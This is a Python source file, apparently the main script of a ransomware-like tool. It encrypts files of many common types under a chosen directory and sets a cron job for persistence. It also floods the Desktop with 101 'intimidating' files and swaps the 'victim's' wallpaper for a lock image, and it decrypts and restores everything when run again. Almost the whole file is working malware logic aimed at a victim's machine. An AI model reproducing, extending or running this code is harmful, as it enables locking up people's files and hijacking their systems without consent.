from CryptoApp import CryptoApp
import os
import json
from operator import itemgetter
from sys import argv
import utils as fn



# Get the starting path
# Otherwise start from the current directory
try:
    START_PATH = argv[1] if os.path.isdir(argv[1]) else os.getcwd()
except IndexError:
    START_PATH = os.getcwd()


# Variables that must be initialized before CryptoApp constructor
JSON_PATH = 'info.json'
lock_wallpaper = os.path.abspath('locked.jpg')
initScript = os.path.abspath('run/key.py')

# Init the APP
APP = CryptoApp(START_PATH)

# Set the initial options
APP.setFilesToSkip([JSON_PATH, '__pycache__', 'locked.jpg', 'utils.py', 'run'])
APP.setExtensionsToModify([
    '.txt', '.docx', '.odt',
    '.jpg', '.png', '.jpeg', '.gif',
    '.mp3', '.mp4', '.avi', 
    '.json', '.conf',
    '.py', '.js', '.html'
])

# Init the variables
target_os, target_de = itemgetter('os', 'de')(APP.determineOS())
new_wallpaper = None
extra_files_name = 'Hello_lock'
desktop_path = os.path.expanduser('~/Desktop')


# Start decrypting
if APP.isAlreadyEncrypted():
    # Remove every extra file that was created during encryption (on desktop)
    fn.removeGlobFiles(desktop_path, extra_files_name)

    APP.decrypt()
    APP.cronAction(target_os, 'stop', initScript)

    # If decrypted successfully, handle the JSON file
    new_wallpaper = fn.handleAndRemoveJSONinfo(JSON_PATH, APP)


# Start encrypting
else:
    APP.encrypt()
    APP.cronAction(target_os, 'start', initScript)

    # Get the total number of modified files and directories
    dirs_num, files_num = itemgetter('dirs', 'files')(APP.getCount()) 

    # Save some informations to a JSON file
    asJSON = fn.saveInfoToJSON(target_os, target_de, dirs_num, files_num)

    # Get the current wallpaper
    currentBG = APP.getDesktopBG(target_os, target_de)
    if currentBG: # And save it to JSON
        asJSON["original_background"] = currentBG
    
    # Locked screen wallpaper
    if os.path.isfile(lock_wallpaper):
        new_wallpaper = lock_wallpaper

    # Create and save the JSON
    j = json.dumps(asJSON, indent=4)
    APP.writeFile(JSON_PATH, j)

    # Create on Desktop some intimidating files
    for i in range(0, 101):
        APP.writeFile(f'{desktop_path}/{extra_files_name}{i}.txt', 'Hello')


# Change the victim's wallpaper
APP.setDesktopBG(target_os, target_de, new_wallpaper)



